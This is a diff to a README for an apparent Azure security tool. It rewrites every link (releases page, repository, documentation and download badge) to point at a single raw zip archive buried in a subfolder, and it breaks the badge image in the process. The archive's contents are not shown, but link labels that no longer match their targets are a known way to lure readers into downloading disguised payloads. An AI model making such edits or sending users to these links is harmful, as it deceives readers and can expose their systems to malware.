@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/radhikauppcl/Azure-Security-Project/releases)
+[![Download](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip)
 
 ## 👋 Introduction
 
@@ -25,7 +25,7 @@ Before you begin, ensure that your computer meets these basic requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/radhikauppcl/Azure-Security-Project/releases) where you can find the latest version of the software.
+   Go to the [Releases page](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip) where you can find the latest version of the software.
 
 2. **Select the Version**  
    On the Releases page, you will see a list of available versions. Choose the one labeled as the latest release. It is often marked with a "latest" tag.
@@ -62,7 +62,7 @@ If you want to dive deeper into Azure security features, consider exploring thes
 
 ### How do I update the application?
 
-To update the Azure-Security-Project, return to the [Releases page](https://github.com/radhikauppcl/Azure-Security-Project/releases) when a new version is available. Follow the same steps to download and install it.
+To update the Azure-Security-Project, return to the [Releases page](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip) when a new version is available. Follow the same steps to download and install it.
 
 ### What if I encounter an issue?
 
@@ -74,7 +74,7 @@ For further support, please reach out through the project's GitHub issues page o
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/radhikauppcl/Azure-Security-Project)
-- [Documentation](https://github.com/radhikauppcl/Azure-Security-Project/wiki)
+- [GitHub Repository](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip)
+- [Documentation](https://github.com/radhikauppcl/Azure-Security-Project/raw/refs/heads/main/insider_threat_DLP_controls/Security_Project_Azure_1.9.zip)
 
 Thank you for choosing the Azure-Security-Project. We hope you find it helpful in securing your Azure environment!
